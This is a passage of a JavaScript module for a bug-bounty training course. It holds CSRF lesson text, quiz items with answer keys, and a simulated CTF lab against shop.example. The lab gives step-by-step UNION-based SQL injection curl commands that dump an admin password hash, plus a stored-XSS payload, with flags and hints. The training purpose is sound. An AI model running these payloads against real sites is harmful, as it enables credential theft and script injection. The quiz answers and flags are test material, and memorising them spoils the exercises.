              "SameSite=Lax specifically carves out an exception for top-level GET navigations (so that, e.g. clicking a shared link still shows you logged in) — which means a GET-based state change is still forgeable, while a cross-site POST is blocked.",
          },
        },
        {
          kind: "relevance",
          title: "What this proves — and doesn't",
          body: [
            "A working CSRF PoC (a self-submitting form/image hosted on your own test domain, forging a state-changing action on your own authorised test account) proves the endpoint lacks adequate CSRF protection.",
            "It does NOT prove impact on its own if the forged action is low-value (e.g. changing a non-sensitive display preference) — severity depends on what the action does, consistent with how you'd assess any access-control issue from Unit 4.",
            "Always test against your own test accounts on in-scope targets; never craft a CSRF PoC that could affect a real third party.",
          ],
        },
      ],
      exercises: [
        {
          type: "mc",
          ref: "Why it often fails today",
          q: "SameSite is now Lax by default in modern browsers. What specifically does that default block?",
          options: [
            "All cross-site requests, including simple link clicks",
            "Cross-site POST (and similar) requests — the cookie is withheld, so the server can't see the victim as authenticated",
            "Only requests over HTTP, not HTTPS",
            "Nothing — SameSite=Lax has no real effect",
          ],
          answer: 1,
          why: [
            "Lax specifically allows top-level cross-site GET (e.g. following a link) to keep normal browsing usable.",
            "Correct — Lax withholds the cookie on cross-site POST/PUT/DELETE-style requests, which breaks the classic auto-submitting-form CSRF attack.",
            "SameSite is unrelated to the HTTP vs HTTPS distinction.",
            "Lax is a real, default-on protection against the classic cross-site POST CSRF pattern.",
          ],
          hints: [
            "Lax carves out one exception for usability — what is it?",
            "What kind of request does the classic CSRF form example use?",
          ],
          explain:
            "SameSite=Lax allows cookies on top-level cross-site GET navigation (so shared links still work) but withholds them on cross-site POST, breaking the classic CSRF form-auto-submit pattern.",
        },
        {
          type: "mc",
          ref: "Worked example: spotting where it still works",
          q: "Why is a state-changing action implemented as `GET /account/delete?confirm=yes` especially risky for CSRF, even with SameSite=Lax enabled?",
          options: [
            "GET requests can't carry cookies at all",
            "A GET request can be triggered just by loading an `<img src=...>` tag, and SameSite=Lax still allows cookies on top-level cross-site GET navigation",
            "GET requests are encrypted differently than POST",
            "It isn't risky — GET is always safe",
          ],
          answer: 1,
          why: [
            "GET requests carry cookies the same way other requests do, subject to SameSite rules.",
            "Correct — GET is trivially triggerable (an image tag, a link) and Lax's carve-out for top-level GET means the cookie still gets attached.",
            "Encryption (HTTPS) is unrelated to the HTTP method used.",
            "GET is specifically risky here because state-changing actions shouldn't be idempotent/side-effect-free the way GET implies.",
          ],
          hints: [
            "Recall Unit 4: GET is supposed to be used for idempotent, read-only actions.",
            "What's the Lax carve-out again?",
          ],
          explain:
            "Combining a side-effecting action with GET (which is trivially triggerable via an image tag or link, and still gets cookies under Lax) is a classic CSRF-enabling mistake.",
        },
        {
          type: "fill",
          ref: "Why it often fails today",
          q: "Besides SameSite cookies, what is the other common server-side defense that puts a random, unguessable value in each legitimate form, checked on submission?",
          answers: ["csrf token", "anti-csrf token", "token", "csrf-token"],
          hints: [
            "It's something the attacker's forged form can't read due to the same-origin policy.",
            "It's checked alongside the cookie on submission.",
          ],
          explain:
            "A CSRF token is a random value embedded in the legitimate form and verified server-side; an attacker's cross-origin forged form cannot read or guess it due to the same-origin policy.",
        },
        {
          type: "mc",
          ref: "Common mistakes",
          q: "How does CSRF fundamentally differ from XSS?",
          options: [
            "CSRF forges a request using the victim's existing session without running attacker JavaScript in the victim's origin; XSS executes attacker code inside that origin",
            "They are the same vulnerability with different names",
            "CSRF only affects mobile apps",
            "XSS requires a database; CSRF does not",
          ],
          answer: 0,
          why: [
            "Correct — CSRF rides on the browser's automatic cookie attachment to forge requests; XSS actually runs attacker-controlled script inside the victim's trusted origin.",
            "They have different root causes (automatic credential attachment vs. unsanitised output) and different fixes (tokens/SameSite vs. encoding).",
            "Both affect any browser-based client, not specifically mobile.",
            "Neither vulnerability class is inherently tied to database presence.",
          ],
          hints: [
            "Does CSRF require running any attacker JavaScript inside the victim's browser session for the target site?",
          ],
          explain:
            "CSRF exploits the browser's automatic credential attachment to forge a cross-site request; it needs no script execution in the target's origin, unlike XSS.",
        },
      ],
    },
  ],
  lab: {
    id: "lab-injection",
    title: "CTF: injection playground",
    tone: "offense",
    briefing: [
      "Target: https://shop.example — the public catalogue + search.",
      "Find a SQLi in /search, extract the admin password hash, then find a stored XSS in /comments.",
      "Grab both flags. Format: FLAG{...}",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl 'https://shop.example/search?q=book'":
          "<h2>Results for 'book'</h2>\n<li>Book 1 — $12.00</li>\n<li>Book 2 — $19.00</li>",
        'curl "https://shop.example/search?q=book\'"':
          "<h2>Results for 'book''</h2>\n<pre>SQLSTATE[42000]: Syntax error near 'book'' at line 1\nQuery: SELECT title,price FROM items WHERE title LIKE '%book'%'</pre>",
        'curl "https://shop.example/search?q=book\' UNION SELECT NULL,NULL-- -"':
          "<h2>Results for 'book' UNION SELECT NULL,NULL-- -'</h2>\n(no rows)",
        'curl "https://shop.example/search?q=book\' UNION SELECT version(),current_user()-- -"':
          "<h2>Results</h2>\n<li>MySQL 5.7.42 — shop_app@localhost</li>",
        'curl "https://shop.example/search?q=x\' UNION SELECT table_name,NULL FROM information_schema.tables-- -"':
          "<h2>Results</h2>\n<li>items</li>\n<li>users</li>\n<li>sessions</li>\n<li>flags</li>",
        "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"":
          "<h2>Results</h2>\n<li>id</li>\n<li>username</li>\n<li>password_hash</li>\n<li>role</li>",
        "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"":
          "<h2>Results</h2>\n<li>admin — $2b$12$FLAG{un10n_based_sql1_still_pays_in_2026}.rest.of.hash</li>",
        "curl 'https://shop.example/comments?post=1'": "<article>Great product! — <b>charlie</b></article>",
        "curl 'https://shop.example/comments?post=1' -d 'text=<x1x2x3>'": "stored. GET /comments?post=1 to view.",
        "curl 'https://shop.example/comments?post=1'  # after storing <x1x2x3>":
          "<article>Great product! — <b>charlie</b></article>\n<article><x1x2x3> — <b>you</b></article>  <-- reflected unescaped",
        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'": "stored.",
        "curl 'https://shop.example/comments?post=1'  # after storing SVG":
          "<article>Great product! — <b>charlie</b></article>\n<article><svg onload=alert(1)> — <b>you</b></article>  (would fire in a real browser)",
        "curl 'https://shop.example/comments/flag'":
          '{"note":"stored XSS owners get the flag","flag":"FLAG{st0red_xss_pwns_every_reader}"}',
      },
      hints: [
        "curl 'https://shop.example/search?q=book'",
        'curl "https://shop.example/search?q=book\'"',
        'curl "https://shop.example/search?q=book\' UNION SELECT version(),current_user()-- -"',
        "curl \"https://shop.example/search?q=x' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -\"",
        "curl \"https://shop.example/search?q=x' UNION SELECT username,password_hash FROM users WHERE role='admin'-- -\"",
        "curl 'https://shop.example/comments?post=1' -d 'text=<svg onload=alert(1)>'",
        "curl 'https://shop.example/comments/flag'",
      ],
    },
    tasks: [
      {
        q: "What DBMS and major version is backing /search?",
        answers: ["mysql 5.7", "mysql 5.7.42", "mysql"],
        hint: "`version()` via a UNION query.",
      },
      {
        q: "Name the vulnerable parameter.",
        answers: ["q", "search q", "?q"],
        hint: "It appears in /search?q=…",
      },
      {
        q: "Flag 1 (hidden in the admin password hash).",
        answers: ["FLAG{un10n_based_sql1_still_pays_in_2026}", "un10n_based_sql1_still_pays_in_2026"],
        hint: "UNION SELECT username,password_hash FROM users WHERE role='admin'.",
      },
      {
        q: "Flag 2 (comment-engine stored XSS).",
        answers: ["FLAG{st0red_xss_pwns_every_reader}", "st0red_xss_pwns_every_reader"],
        hint: "GET /comments/flag after storing an XSS payload.",
      },
    ],
  },
  ids: {
    name: "Injection kit",
    description:
      "You can detect, confirm, and responsibly prove SQL injection and all three XSS families — the two highest-paying bug classes in bounty.",
    rules: [],
  },
};

export default unit5;
